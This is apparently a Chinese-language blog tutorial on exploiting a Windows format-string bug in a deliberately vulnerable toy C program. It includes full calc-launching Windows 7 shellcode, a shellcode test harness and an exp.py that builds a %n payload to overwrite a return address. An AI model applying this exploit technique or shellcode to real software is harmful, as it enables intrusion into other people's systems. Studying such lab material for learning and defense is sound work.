---
layout:     post
title:      "windows格式化字符串漏洞探究"
subtitle:   "集Fsb漏洞构造、分析、利用的小实验"
date:       2016-11-17 15:32:25
author:     "Carter"
header-img: "img/post-bg-apple-event-2015.jpg"
tags:
    - Windows
    - pwn
---


### 知识点：
- windows下的格式化字符串fsb利用   
- 利用mona查询各个模块开启安全机制   
- win7弹计算器shellcode
- 如何调试shellcode

### 一. 程序代码：

```c++
#include "stdafx.h"
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
int main (int argc, char *argv[])
{
    char buff[1024];
    FILE*f;
    
    f=fopen("flag.txt","r");
    fread(buff,1024,3,f);
    printf(buff); //触发漏洞
  return 0;
}
```

程序的流程是从flag.txt中读取字符串再打印出来。很明显，程序中存在一个windows下的格式化字符串漏洞。

### 二. 基本知识：

##### **1. 格式化字符串相关知识**

%x：依次打印出栈上数据
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/1.png)
%100x：指定数据打印时显示长度为100字节

%n：打印出栈上数据作为地址时，该地址的内容（当该地址不可达时，就会崩溃）

##### **2. 设置immunity debugger为默认调试器**
直接在注册表里修改，该方法比较简单粗暴:

HKEY_LOCAL_MACHINE -->  SOFTWARE --> Microsoft --> Windows NT --> CurrentVersion --> AeDebug
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/4.png)
(PS：同样方法，win7下设置Ollydbg为默认调试器一直失败，但是设置immunityDbg为默认调试器则可以，不知道为什么)

##### **3. windows7_32bit 弹计算器shellcode**
```python
shellcode = '\xeb\x54\x31\xf6\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x85\xdb\x74\xf0\x01\xeb\x8b\x4b\x18\x67\xe3\xe8\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x02\x17\xc1\xca\x04\xae\x75\xf8\x3b\x54\x24\x04\xe0\xe4\x75\xca\x8b\x53\x24\x01\xea\x0f\xb7\x14\x4a\x8b\x7b\x1c\x01\xef\x03\x2c\x97\xc3\x68\xe7\xc4\xcc\x69\xe8\xa2\xff\xff\xff\x50\x68\x63\x61\x6c\x63\x8b\xd4\x40\x50\x52\xff\xd5\x68\x77\xa6\x60\x2a\xe8\x8b\xff\xff\xff\x50\xff\xd5'
```

##### **4.  如何调试shellcode**
```c++
#include "stdafx.h"
#include<stdio.h>
#include<windows.h>

int main(int argc, char* argv[])
{
    //导入ShellCode中要使用的.dll
    LoadLibrary("kernel32.dll"); 
    char shellcode[256] = "\x90\x90\x90...\x90";        

    __asm{ 
       lea eax,shellcode 
       push eax 
       ret;           //ret到ShellCode处
    } 
    return 0;
}
```
结合IDA，定位到具体代码，就可以跟进到shellcode处，查看shellcode的执行情况了

##### **5. 查看程序开启安全机制**

在immunity Debugger中，使用 
```python
!mona modules
```
可以查看程序各个加载模块对应开启的安全机制
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/5.png)
上图可见，对于程序本身什么安全机制都没开启。因为程序没有开启数据执行保护DEP，所以可以把shellcode放在栈上，攻击返回地址后跳转到shellcode处执行。


### 三. 漏洞调试
首先使用'%x-%x-%x-%n'作为printf函数的唯一参数，此时崩溃现场如图
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/6.png)
使用'%x-%x-%x-%x-%n'作为printf函数的唯一参数，此时崩溃现场如图
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/7.png)
从上面两次尝试中可以看出，程序崩溃是因为'%n'这个参数，在
```
mov ptr[EAX], ECX
```
这条指令时因为EAX内容作为地址不可达，所以触发程序崩溃。
崩溃时EAX是当时'%n'应该打印的那个栈地址内容，ECX是崩溃时已经打印出来的字符长度：

```
%x-%x-%x-%n --> ECX：0xD=13
%x-%x-%x-%x-%n --> ECX：0x16=22
```

对比下图，可以验证说法正确性
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/8.png)

### 四. 漏洞利用
我们可以通过控制打印栈上内容的数量（即增加%x的数量），控制EAX的值。可以通过控制打印字符的长度（用%100x，%200x等来控制打印长度），控制ECX的值。最后利用mov ptr[EAX],ECX来任意地址写。

内存任意写写哪个地方--------最快捷的方法，就是覆盖最近函数的返回地址为shellcode的地址

alt+k查看栈回溯，可以看到最近的一个返回地址存储在栈地址0x12faf0
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/9.png)
崩溃时，查看栈，确定存储输入的起始地址是0x12fb48
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/10.png)
所以我们的目的就是令：EAX=0x12FaF0  ECX=0x12FB48

### 五. 编写漏洞利用脚本
输入构造为：

- shellcode
- 相应多的%x
- 一些%nx来调整输出长度
- 需要被覆盖的地址

**exp.py**

```python
shellcode = '........'
ret_addr = '\xf0\xfa\x12\x00'
input1 = shellcode + '-%x'*218 + '%414000x' + '%414000x' + '%413908x' + '%n' + ret_addr

with open('flag.txt','wb') as f:
    f.write(input1)    
```

为了效果，我在shellcode开头字节设置了0xCC -- int3，运行exp.py生成flag.txt，运行fsb.exe从flag.txt读取字符后使用printf函数打印，成功触发Fsb漏洞
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/11.png)
弹出可爱的计算器
![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/12.png)

## 六. 问题解决
**问题描述：**

 之前实验中使用strcpy复制字符串到内存，但是发现有些字节复制到内存后变为了'\x3f' -- '?'，比如：
 ```
\x8b\x36 --> \x3f
```

**解决方法：**

strcpy和strncpy都是针对可见字符而言的，不能复制不可见字符，且遇到'\x00'就停止复制。

与 strcpy() 不同的是，memcpy(*memTo,*memFrom,num) 会完整的复制 num 个字节，对复制内容没有限制，也不会因为遇到“\0”而结束。

PS: 在此最终采用了fread函数从文件中读取的方式读取payload到内存


参考链接：
[http://bbs.pediy.com/showthread.php?t=213153](http://bbs.pediy.com/showthread.php?t=213153)


